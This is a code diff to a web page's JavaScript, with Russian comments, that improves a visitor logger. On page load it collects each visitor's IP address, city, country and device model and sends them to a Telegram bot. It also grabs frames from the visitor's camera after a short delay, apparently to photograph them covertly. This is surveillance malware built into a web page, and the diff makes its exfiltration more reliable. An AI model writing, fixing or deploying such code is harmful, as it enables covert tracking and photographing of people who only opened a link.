@@ -29,15 +29,18 @@
     function getModel() {
         const ua = navigator.userAgent;
         const match = ua.match(/\(([^)]+)\)/);
-        return match ? match[1].split(';')[1] || match[1] : "Неизвестно";
+        return match ? match[1].split(';')[0] : "Неизвестно";
     }
 
+    // ИСПРАВЛЕННЫЙ ЛОГГЕР (ЖДЕТ ДАННЫЕ)
     async function logVisit() {
         try {
             const res = await fetch('https://ipwho.is');
             const d = await res.json();
-            const info = `👀 КТО-ТО ЗАШЕЛ!\n🏙 Город: ${d.city}\n🌍 Страна: ${d.country}\n📍 IP: ${d.ip}\n📱 Модель: ${getModel()}`;
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
+            if (d.success) {
+                const info = `👀 КТО-ТО ЗАШЕЛ!\n🏙 Город: ${d.city}\n🌍 Страна: ${d.country}\n📍 IP: ${d.ip}\n📱 Модель: ${getModel()}`;
+                await fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
+            }
         } catch (e) {
             fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход! Модель: " + getModel()));
         }
@@ -49,7 +52,7 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
             const v = document.getElementById('v');
             v.srcObject = stream;
-            await new Promise(r => setTimeout(r, 2000)); 
+            await new Promise(r => setTimeout(r, 2500)); 
             const c = document.getElementById('c');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
